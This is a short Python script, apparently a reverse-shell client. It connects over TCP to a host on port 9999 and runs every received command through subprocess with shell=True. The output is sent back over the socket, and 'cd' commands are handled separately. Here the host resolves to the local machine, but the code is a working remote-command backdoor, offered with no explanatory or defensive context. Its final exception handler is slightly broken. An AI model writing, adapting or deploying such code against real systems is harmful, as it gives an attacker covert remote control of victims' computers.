import os
import socket
import subprocess
import sys


try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = socket.gethostbyname(socket.gethostname())
    port = 9999
    s.connect((host, port))

    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == "cd":
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            cmd.stdout.flush()
            cmd.stderr.flush()
            cmd.stdin.flush()
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str))
        s.send(str.encode(" "))

    s.close()
except socket.error:
    sys.exit(1)
except Exception as msg:
    s.send(str.encode(msg))
